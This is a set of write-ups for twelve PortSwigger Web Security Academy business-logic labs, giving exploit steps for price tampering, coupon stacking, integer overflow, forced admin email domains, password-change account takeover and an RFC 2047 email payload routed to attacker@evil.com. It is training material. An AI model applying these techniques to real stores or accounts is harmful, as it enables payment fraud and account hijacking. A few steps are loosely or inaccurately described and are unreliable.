# Business Logic Flaws Labs 01-12 — Proof of Concept Writeups

This document contains structured Proof of Concept (PoC) writeups for Business Logic Flaws (BLF) Labs 01 to 12 from the PortSwigger Web Security Academy.

---

## Lab 01 — Excessive Trust in Client-Side Controls

- **Goal:** Buy the "Lightweight l33t leather jacket" for less than its normal price.
- **Vulnerability:** The price parameter is passed and trusted from the client request.

### Proof of Concept (PoC)
1. Add the jacket to the cart.
2. Intercept the `POST /cart` request in Burp Suite.
3. Locate the `price` parameter:
   ```http
   productId=1&price=133700&quantity=1
   ```
4. Change `price=133700` to `price=10` (10 cents).
5. Forward the request and complete the checkout.

### Why It Works
The server does not validate the price against its database records. It trusts the price value sent directly from the client's request body when adding the item to the cart.

---

## Lab 02 — High-level Logic Vulnerability

- **Goal:** Buy the leather jacket for a fraction of its normal price.
- **Vulnerability:** Negative quantities allowed in cart calculations.

### Proof of Concept (PoC)
1. Add the leather jacket (Product ID 1) to your cart.
2. Add a cheaper item (e.g., Product ID 2) to your cart.
3. Intercept the request to update the quantity of Product ID 2 and change it to a negative number (e.g., `quantity=-100`).
4. Adjust the negative quantity of the cheap item until the total cart balance is positive but extremely small (e.g., `$0.01`).
5. Complete the checkout.

### Why It Works
The backend checks if the final cart total is greater than zero but fails to prevent negative quantities. This allows the cost of the negative items to offset the cost of the expensive jacket, reducing the total bill.

---

## Lab 03 — Inconsistent Security Controls

- **Goal:** Access the admin panel and delete Carlos.
- **Vulnerability:** Domain restrictions are enforced during registration but ignored during email updates.

### Proof of Concept (PoC)
1. Register a new user using a standard email domain (e.g., `user@normal-user.net`).
2. Log in and go to your profile settings.
3. Update your email to use the target internal domain: `user@dontwannapay.com` (or `@ginandjuice.shop`).
4. Since the email update process does not validate domain rules, the account is successfully updated.
5. The application dynamically grants admin privileges to users with this email domain. Access `/admin` and delete `carlos`.

### Why It Works
Different developers wrote the registration logic and profile update logic. Registration checks domain restrictions, but the profile editor lacks this validation, leading to inconsistent security controls.

---

## Lab 04 — Flawed Enforcement of Business Rules

- **Goal:** Buy the leather jacket using multiple coupons.
- **Vulnerability:** Reusable and stackable coupon logic.

### Proof of Concept (PoC)
1. Add the jacket to the cart.
2. Apply the coupon `NEW20`.
3. Apply another coupon `SIGNUP`.
4. Apply `NEW20` again. Notice the discount increases because the application doesn't track that the code was already used.
5. Cycle both codes repeatedly until the cart total drops to `$0.00`.
6. Complete the checkout.

### Why It Works
The system validates that each individual coupon code is valid and applies the discount, but it fails to check if the user has already used that code or if codes are stackable.

---

## Lab 05 — Low-level Logic Flaw (Integer Overflow)

- **Goal:** Buy the leather jacket.
- **Vulnerability:** Cart total integer overflow.

### Proof of Concept (PoC)
1. Add the leather jacket to your cart.
2. Add another item with a very large quantity designed to wrap the integer value (e.g., `quantity=9999999`).
3. Intercept the request in Burp, and duplicate the add-to-cart request multiple times using Intruder until the database total overflows the maximum 32-bit integer limit (`2,147,483,647`).
4. Once the total rolls over into a negative number, add enough jackets to bring the cart total back to a positive, affordable number (between `$0.00` and your account balance).
5. Place the order.

### Why It Works
The cart uses signed integers to track totals. When the value exceeds the maximum limit, it wraps around to a negative value. The application accepts the negative total for checkout validations.

---

## Lab 06 — Inconsistent Handling of Exceptional Input (Email Truncation)

- **Goal:** Access the administrative panel.
- **Vulnerability:** Database truncation discrepancy.

### Proof of Concept (PoC)
1. Establish that the database truncates input strings at 255 characters.
2. Register an email address exactly matching:
   ```
   [240-char-dummy-prefix]@dontwannapay.com.test.web-security-academy.net
   ```
   Make sure the character at position 255 cuts off exactly at `.com`.
3. Submit registration. The validation check verifies it ends with the academy's test domain.
4. The database stores the truncated string: `...[prefix]@dontwannapay.com`.
5. Access the administrative panel using the privilege granted to the truncated internal domain.

### Why It Works
The validator reads the untruncated string, but the database drops characters exceeding 255 bytes during storage. The application then evaluates access rights using the stored (truncated) value.

---

## Lab 07 — Weak Isolation on Dual-Use Endpoint

- **Goal:** Hijack the `administrator` account.
- **Vulnerability:** Account updates specify target username parameter.

### Proof of Concept (PoC)
1. Log in to your account.
2. Go to the password change page.
3. Observe the POST request in Burp:
   ```http
   username=wiener&current-password=peter&new-password-1=123&new-password-2=123
   ```
4. Change `username=wiener` to `username=administrator`. Remove or ignore the `current-password` validation check if permitted, or submit.
5. Log in as `administrator` with your new password.

### Why It Works
The password update handler trusts the `username` parameter sent in the request body instead of binding the action to the user ID stored in the current session.

---

## Lab 08 — Insufficient Workflow Validation

- **Goal:** Purchase the leather jacket without paying.
- **Vulnerability:** Skipping state validations.

### Proof of Concept (PoC)
1. Add the jacket to your cart.
2. Click "Checkout" and intercept the payment request.
3. Instead of forwarding the payment API request, navigate directly to the order confirmation page:
   ```http
   GET /cart/order-confirmation?order-confirmed=true HTTP/2
   ```
4. The order completes successfully.

### Why It Works
The order confirmation page only verifies that the parameter `order-confirmed=true` is present, without verifying whether a successful payment transaction occurred in the session log.

---

## Lab 9 — Authentication Bypass via Flawed State Machine

- **Goal:** Bypass authentication flow to log in as administrator.
- **Vulnerability:** Unfinished authentication role state defaults.

### Proof of Concept (PoC)
1. Log in with your credentials.
2. The page redirects to a role selection page (`/select-role`).
3. Instead of selecting a role, drop the request in Burp and navigate directly to the root URL `/` (or `/my-account`).
4. The state machine assumes that completing the password step is sufficient and logs you in as `administrator`.

### Why It Works
The application logs the user in immediately after the password check. The subsequent role-selection screen is a visual step that can be skipped by requesting other endpoints directly.

---

## Lab 10 — Infinite Money Logic Flaw

- **Goal:** Buy the leather jacket.
- **Vulnerability:** Coupon discount greater than gift card cost.

### Proof of Concept (PoC)
1. Apply coupon `SIGNUP` to purchase a `$10` gift card for `$8`.
2. Complete checkout and extract the gift card code.
3. Redeem the card. Your balance is now `$10` (a `$2` profit).
4. Automate this process using a script or macro to generate infinite funds.
5. Purchase the leather jacket.

### Why It Works
The application permits users to apply discount coupons to gift card purchases. Because the discount rate is higher than the transaction fees, it creates a loophole for generating infinite credit.

---

## Lab 11 — Authentication Bypass via Encryption Oracle

- **Goal:** Log in as administrator.
- **Vulnerability:** Decrypted input reflected as an error message.

### Proof of Concept (PoC)
1. Access the application and observe the `notification` cookie encrypted with a custom algorithm.
2. Submit invalid input to the notification field. The server attempts to decrypt it, fails, and displays the decrypted string in an error message (acting as a decryption oracle).
3. Craft a cookie payload containing `admin` credentials, pass it to the oracle to get the encrypted equivalent, and use it as your session cookie.

### Why It Works
The application uses the same encryption key for session cookies and public notifications. An attacker can use the error messages of the notification system to encrypt arbitrary session strings.

---

## Lab 12 — Bypassing Access Controls via Email Parsing Discrepancies

- **Goal:** Log in and access administrative features.
- **Vulnerability:** RFC 2047 email address parsing discrepancy.

### Proof of Concept (PoC)
1. Register using an email formatted with RFC 2047 encoded words:
   ```
   =?utf-7?q?attacker&AEA-evil.com&ACA-?=@ginandjuice.shop
   ```
2. The regex validation component reads the email as ending with `@ginandjuice.shop`.
3. The mail relay server decodes the UTF-7 string, translating `&AEA-` to `@`, and routes the verification email to `attacker@evil.com`.
4. Retrieve the code and verify the account to gain administrative access.

### Why It Works
The validation parser treats the raw encoded-word text as part of the local name, while the SMTP mail server decodes the string before routing, delivering the email to a different mailbox.
